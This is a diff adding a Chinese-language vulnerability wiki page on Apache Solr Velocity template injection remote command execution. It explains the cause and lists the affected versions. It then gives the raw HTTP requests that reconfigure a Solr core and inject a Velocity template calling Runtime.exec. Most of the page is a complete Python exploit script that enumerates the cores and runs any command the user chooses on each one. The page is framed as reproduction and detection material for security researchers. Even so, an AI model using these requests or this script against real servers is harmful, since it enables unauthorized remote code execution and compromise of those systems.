@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Solr Velocity模版注入远程命令执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Solr Velocity\u6a21\u7248\u6ce8\u5165\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
+        Apache-Solr 任意文件读取漏洞复现
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2020-1957）Apache Shiro \&lt; 1.5.2 身份认证绕过漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-solr-velocity">Apache Solr Velocity模版注入远程命令执行<a class="headerlink" href="#apache-solr-velocity" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>该漏洞的产生是由于两方面的原因：</p>
+<p>1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。2、2Apache
+Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置paramsresource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。</p>
+<p>推测影响全版本Apache Solr。</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">手动检测<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>手动检测访问http://<a href="http://www.0-sec.org/8983/solr/">www.0-sec.org/8983/solr/</a>#/进入主界面，单击左侧的Core
+Selector查看集合名称</p>
+<p><img alt="" src="../resource/ApacheSolrVelocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png" /></p>
+<h4 id="1post">1、post发送请求<a class="headerlink" href="#1post" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/solr/test/config</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">solr:8983</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">259</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;update-queryresponsewriter&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;startup&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;lazy&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;velocity&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;class&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;solr.VelocityResponseWriter&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;template.base.dir&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;solrresource.loader.enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;true&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;paramsresource.loader.enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;true&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h4 id="2">2、执行系统命令<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8983</span>
+</code></pre></div>
+
+<h3 id="_5">使用脚本检测<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="n">auth</span><span class="p">:</span> <span class="nd">@l3_W0ng</span>
+<span class="n">version</span><span class="p">:</span> <span class="mf">1.0</span>
+<span class="n">function</span><span class="p">:</span> <span class="n">Apache</span> <span class="n">Solr</span> <span class="n">RCE</span> <span class="n">via</span> <span class="n">Velocity</span> <span class="n">template</span>
+<span class="n">usage</span><span class="p">:</span> <span class="n">python3</span> <span class="n">script</span><span class="o">.</span><span class="n">py</span> <span class="n">ip</span> <span class="p">[</span><span class="n">port</span> <span class="p">[</span><span class="n">command</span><span class="p">]]</span>
+               <span class="n">default</span> <span class="n">port</span><span class="o">=</span><span class="mi">8983</span>
+               <span class="n">default</span> <span class="n">command</span><span class="o">=</span><span class="n">whoami</span>
+<span class="n">note</span><span class="p">:</span>
+<span class="n">Step1</span><span class="p">:</span> <span class="n">Init</span> <span class="n">Apache</span> <span class="n">Solr</span> <span class="n">Configuration</span>
+<span class="n">Step2</span><span class="p">:</span> <span class="n">Remote</span> <span class="n">Exec</span> <span class="ow">in</span> <span class="n">Every</span> <span class="n">Solr</span> <span class="n">Node</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+
+<span class="s2">import sys</span>
+<span class="s2">import json</span>
+<span class="s2">import time</span>
+<span class="s2">import requests</span>
+
+
+<span class="s2">class initSolr(object):</span>
+
+<span class="s2">    timestamp_s = str(time.time()).split(&#39;.&#39;)</span>
+<span class="s2">    timestamp = timestamp_s[0] + timestamp_s[1][0:-3]</span>
+
+<span class="s2">    def __init__(self, ip, port):</span>
+<span class="s2">        self.ip = ip</span>
+<span class="s2">        self.port = port</span>
+
+<span class="s2">    def get_nodes(self):</span>
+<span class="s2">        payload = {</span>
+<span class="s2">            &#39;_&#39;: self.timestamp,</span>
+<span class="s2">            &#39;indexInfo&#39;: &#39;false&#39;,</span>
+<span class="s2">            &#39;wt&#39;: &#39;json&#39;</span>
+<span class="s2">        }</span>
+<span class="s2">        url = &#39;http://&#39; + self.ip + &#39;:&#39; + self.port + &#39;/solr/admin/cores&#39;</span>
+
+<span class="s2">        try:</span>
+<span class="s2">            nodes_info = requests.get(url, params=payload, timeout=5)</span>
+<span class="s2">            node = list(nodes_info.json()[&#39;status&#39;].keys())</span>
+<span class="s2">            state = 1</span>
+<span class="s2">        except:</span>
+<span class="s2">            node = &#39;&#39;</span>
+<span class="s2">            state = 0</span>
+
+<span class="s2">        if node:</span>
+<span class="s2">            return {</span>
+<span class="s2">                &#39;node&#39;: node,</span>
+<span class="s2">                &#39;state&#39;: state,</span>
+<span class="s2">                &#39;msg&#39;: &#39;Get Nodes Successfully&#39;</span>
+<span class="s2">            }</span>
+<span class="s2">        else:</span>
+<span class="s2">            return {</span>
+<span class="s2">                &#39;node&#39;: None,</span>
+<span class="s2">                &#39;state&#39;: state,</span>
+<span class="s2">                &#39;msg&#39;: &#39;Get Nodes Failed&#39;</span>
+<span class="s2">            }</span>
+
+<span class="s2">    def get_system(self):</span>
+<span class="s2">        payload = {</span>
+<span class="s2">            &#39;_&#39;: self.timestamp,</span>
+<span class="s2">            &#39;wt&#39;: &#39;json&#39;</span>
+<span class="s2">        }</span>
+<span class="s2">        url = &#39;http://&#39; + self.ip + &#39;:&#39; + self.port + &#39;/solr/admin/info/system&#39;</span>
+<span class="s2">        try:</span>
+<span class="s2">            system_info = requests.get(url=url, params=payload, timeout=5)</span>
+<span class="s2">            os_name = system_info.json()[&#39;system&#39;][&#39;name&#39;]</span>
+<span class="s2">            os_uname = system_info.json()[&#39;system&#39;][&#39;uname&#39;]</span>
+<span class="s2">            os_version = system_info.json()[&#39;system&#39;][&#39;version&#39;]</span>
+<span class="s2">            state = 1</span>
+
+<span class="s2">        except:</span>
+<span class="s2">            os_name = &#39;&#39;</span>
+<span class="s2">            os_uname = &#39;&#39;</span>
+<span class="s2">            os_version = &#39;&#39;</span>
+<span class="s2">            state = 0</span>
+
+<span class="s2">        return {</span>
+<span class="s2">            &#39;system&#39;: {</span>
+<span class="s2">                &#39;name&#39;: os_name,</span>
+<span class="s2">                &#39;uname&#39;: os_uname,</span>
+<span class="s2">                &#39;version&#39;: os_version,</span>
+<span class="s2">                &#39;state&#39;: state</span>
+<span class="s2">            }</span>
+<span class="s2">        }</span>
+
+
+<span class="s2">class apacheSolrRCE(object):</span>
+
+<span class="s2">    def __init__(self, ip, port, node, command):</span>
+<span class="s2">        self.ip = ip</span>
+<span class="s2">        self.port = port</span>
+<span class="s2">        self.node = node</span>
+<span class="s2">        self.command = command</span>
+<span class="s2">        self.url = &quot;http://&quot; + self.ip + &#39;:&#39; + self.port + &#39;/solr/&#39; + self.node</span>
+
+<span class="s2">    def init_node_config(self):</span>
+<span class="s2">        url = self.url + &#39;/config&#39;</span>
+<span class="s2">        payload = {</span>
+<span class="s2">            &#39;update-queryresponsewriter&#39;: {</span>
+<span class="s2">                &#39;startup&#39;: &#39;lazy&#39;,</span>
+<span class="s2">                &#39;name&#39;: &#39;velocity&#39;,</span>
+<span class="s2">                &#39;class&#39;: &#39;solr.VelocityResponseWriter&#39;,</span>
+<span class="s2">                &#39;template.base.dir&#39;: &#39;&#39;,</span>
+<span class="s2">                &#39;solrresource.loader.enabled&#39;: &#39;true&#39;,</span>
+<span class="s2">                &#39;paramsresource.loader.enabled&#39;: &#39;true&#39;</span>
+<span class="s2">            }</span>
+<span class="s2">        }</span>
+<span class="s2">        try:</span>
+<span class="s2">            res = requests.post(url=url, data=json.dumps(payload), timeout=5)</span>
+<span class="s2">            if res.status_code == 200:</span>
+<span class="s2">                return {</span>
+<span class="s2">                    &#39;init&#39;: &#39;Init node config successfully&#39;,</span>
+<span class="s2">                    &#39;state&#39;: 1</span>
+<span class="s2">                }</span>
+<span class="s2">            else:</span>
+<span class="s2">                return {</span>
+<span class="s2">                    &#39;init&#39;: &#39;Init node config failed&#39;,</span>
+<span class="s2">                    &#39;state&#39;: 0</span>
+<span class="s2">                }</span>
+<span class="s2">        except:</span>
+<span class="s2">            return {</span>
+<span class="s2">                &#39;init&#39;: &#39;Init node config failed&#39;,</span>
+<span class="s2">                &#39;state&#39;: 0</span>
+<span class="s2">            }</span>
+
+<span class="s2">    def rce(self):</span>
+<span class="s2">        url = self.url + (&quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23s</span><span class="s2">et($x=</span><span class="si">%27%</span><span class="s2">27)+&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23s</span><span class="s2">et($rt=$x.class.forName(%27java.lang.Runtime%27))+&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23s</span><span class="s2">et($chr=$x.class.forName(%27java.lang.Character%27))+&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23s</span><span class="s2">et($str=$x.class.forName(%27java.lang.String%27))+&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23s</span><span class="s2">et($ex=$rt.getRuntime().exec(%27&quot; + self.command +</span>
+<span class="s2">                          &quot;%27))+$ex.waitFor()+</span><span class="si">%23s</span><span class="s2">et($out=$ex.getInputStream())+&quot;</span>
+<span class="s2">                          &quot;</span><span class="si">%23f</span><span class="s2">oreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><span class="si">%23e</span><span class="s2">nd&quot;)</span>
+<span class="s2">        try:</span>
+<span class="s2">            res = requests.get(url=url, timeout=5)</span>
+<span class="s2">            if res.status_code == 200:</span>
+<span class="s2">                try:</span>
+<span class="s2">                    if res.json()[&#39;responseHeader&#39;][&#39;status&#39;] == &#39;0&#39;:</span>
+<span class="s2">                        return &#39;RCE failed @Apache Solr node </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#39; </span><span class="si">% s</span><span class="s2">elf.node</span>
+<span class="s2">                    else:</span>
+<span class="s2">                        return &#39;RCE failed @Apache Solr node </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#39; </span><span class="si">% s</span><span class="s2">elf.node</span>
+<span class="s2">                except:</span>
+<span class="s2">                    return &#39;RCE Successfully @Apache Solr node </span><span class="si">%s</span><span class="se">\n</span><span class="s2"> </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#39; % (self.node, res.text.strip().strip(&#39;0&#39;))</span>
+
+<span class="s2">            else:</span>
+<span class="s2">                return &#39;RCE failed @Apache Solr node </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#39; </span><span class="si">% s</span><span class="s2">elf.node</span>
+<span class="s2">        except:</span>
+<span class="s2">            return &#39;RCE failed @Apache Solr node </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#39; </span><span class="si">% s</span><span class="s2">elf.node</span>
+
+
+<span class="s2">def check(ip, port=&#39;8983&#39;, command=&#39;whoami&#39;):</span>
+<span class="s2">    system = initSolr(ip=ip, port=port)</span>
+<span class="s2">    if system.get_nodes()[&#39;state&#39;] == 0:</span>
+<span class="s2">        print(&#39;No Nodes Found. Remote Exec Failed!&#39;)</span>
+<span class="s2">    else:</span>
+<span class="s2">        nodes = system.get_nodes()[&#39;node&#39;]</span>
+<span class="s2">        systeminfo = system.get_system()</span>
+<span class="s2">        os_name = systeminfo[&#39;system&#39;][&#39;name&#39;]</span>
+<span class="s2">        os_version = systeminfo[&#39;system&#39;][&#39;version&#39;]</span>
+<span class="s2">        print(&#39;OS Realese: </span><span class="si">%s</span><span class="s2">, OS Version: </span><span class="si">%s</span><span class="se">\n</span><span class="s2">if remote exec failed, &#39;</span>
+<span class="s2">              &#39;you should change your command with right os platform</span><span class="se">\n</span><span class="s2">&#39; % (os_name, os_version))</span>
+
+<span class="s2">        for node in nodes:</span>
+<span class="s2">            res = apacheSolrRCE(ip=ip, port=port, node=node, command=command)</span>
+<span class="s2">            init_node_config = res.init_node_config()</span>
+<span class="s2">            if init_node_config[&#39;state&#39;] == 1:</span>
+<span class="s2">                print(&#39;Init node </span><span class="si">%s</span><span class="s2"> Successfully, exec command=</span><span class="si">%s</span><span class="s2">&#39; % (node, command))</span>
+<span class="s2">                result = res.rce()</span>
+<span class="s2">                print(result)</span>
+<span class="s2">            else:</span>
+<span class="s2">                print(&#39;Init node </span><span class="si">%s</span><span class="s2"> Failed, Remote Exec Failed</span><span class="se">\n</span><span class="s2">&#39; % node)</span>
+
+
+<span class="s2">if __name__ == &#39;__main__&#39;:</span>
+<span class="s2">    usage = (&#39;python3 script.py ip [port [command]]</span><span class="se">\n</span><span class="s2"> &#39;</span>
+<span class="s2">             &#39;</span><span class="se">\t\t</span><span class="s2">default port=8983</span><span class="se">\n</span><span class="s2"> &#39;</span>
+<span class="s2">             &#39;</span><span class="se">\t\t</span><span class="s2">default command=whoami&#39;)</span>
+
+<span class="s2">    if len(sys.argv) == 4:</span>
+<span class="s2">        ip = sys.argv[1]</span>
+<span class="s2">        port = sys.argv[2]</span>
+<span class="s2">        command = sys.argv[3]</span>
+<span class="s2">        check(ip=ip, port=port, command=command)</span>
+<span class="s2">    elif len(sys.argv) == 3:</span>
+<span class="s2">        ip = sys.argv[1]</span>
+<span class="s2">        port = sys.argv[2]</span>
+<span class="s2">        check(ip=ip, port=port)</span>
+<span class="s2">    elif len(sys.argv) == 2:</span>
+<span class="s2">        ip = sys.argv[1]</span>
+<span class="s2">        check(ip=ip)</span>
+<span class="s2">    else:</span>
+<span class="s2">        print(&#39;Usage: </span><span class="si">%s</span><span class="s2">:</span><span class="se">\n</span><span class="s2">&#39; </span><span class="si">% u</span><span class="s2">sage)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
+        Apache-Solr 任意文件读取漏洞复现
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache%20Shiro/%EF%BC%88CVE-2020-1957%EF%BC%89Apache%20Shiro%20_%201.5.2%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2020-1957）Apache Shiro \&lt; 1.5.2 身份认证绕过漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
